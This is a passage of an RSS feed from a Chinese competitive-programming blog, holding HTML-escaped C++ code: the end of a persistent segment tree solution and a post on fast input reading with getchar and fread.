class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;query&lt;/span&gt;(rc[o],mid+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,r,q);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;T;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;fread&lt;/span&gt;(buf,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,MAXB,stdin);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    n=&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; m=&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a[i]=&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    T.&lt;span class=&#34;built_in&#34;&gt;build&lt;/span&gt;(rt[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;],&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=m;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; pre=&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(),opt=&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(),x=&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(opt==&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#123;&lt;span class=&#34;comment&#34;&gt;//操作1:在版本pre的基础上将第x个数修改为v &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v=&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            T.&lt;span class=&#34;built_in&#34;&gt;ins&lt;/span&gt;(rt[i],rt[pre],&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,n,x,v);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(opt==&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) &amp;#123;&lt;span class=&#34;comment&#34;&gt;//操作2:访问版本pre中第x个数的值 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;,T.&lt;span class=&#34;built_in&#34;&gt;query&lt;/span&gt;(rt[pre],&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,n,x));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            rt[i]=rt[pre];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2018/02/20/OI%E4%B8%AD%E7%9A%84IO%E4%BC%98%E5%8C%96/</guid>
            <title>OI中的IO优化</title>
            <link>http://cubicy.icu/2018/02/20/OI%E4%B8%AD%E7%9A%84IO%E4%BC%98%E5%8C%96/</link>
            <pubDate>Tue, 20 Feb 2018 21:09:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;本文主要讲述常用的2种读入优化方法。&lt;br&gt;输出优化很少使用，在此简单提一下：也就是把输出的东西先放进字符串，再一次性puts\printf出去。提升不大，不常用。&lt;br&gt;首先当然需要先知道，scanf&amp;#x2F;printf比cin&amp;#x2F;cout快不少。&lt;br&gt;读入优化： &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;getchar&lt;br&gt;使用getchar一个一个读入字符，转化成数字。比scanf快一些。&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; f=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,x=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//f是正负的标识&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; ch;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ch=&lt;span class=&#34;built_in&#34;&gt;getchar&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(ch==&lt;span class=&#34;string&#34;&gt;&amp;#x27;-&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            f=&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(ch&amp;lt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;||ch&amp;gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;9&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        x=x*&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;+ch-&lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ch=&lt;span class=&#34;built_in&#34;&gt;getchar&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(ch&amp;gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;&amp;amp;&amp;amp;ch&amp;lt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;9&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; f*x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
2.fread  （非常快！）&lt;br&gt;fread将stdin里的内容读到字符串里，然后利用指针处理。&lt;br&gt;首先定义指针和读入的数组：  &lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; MAXB 10000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//定义读入最长的长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[MAXB],*cp=buf;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
接下来是读入：  &lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;fread&lt;/span&gt;(buf,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,MAXB,stdin);&lt;span class=&#34;comment&#34;&gt;//函数具体参数含义请善用搜索引擎&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
最后是从中处理出数据（现在这个函数是为了处理int整型而设计）  &lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; f=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,x=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(*cp&amp;lt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;||*cp&amp;gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;9&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(*cp==&lt;span class=&#34;string&#34;&gt;&amp;#x27;-&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            f=&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cp++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(*cp&amp;gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;&amp;amp;&amp;amp;*cp&amp;lt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;9&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        x=x*&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;+*cp-&lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cp++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; f*x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
    </channel>
</rss>
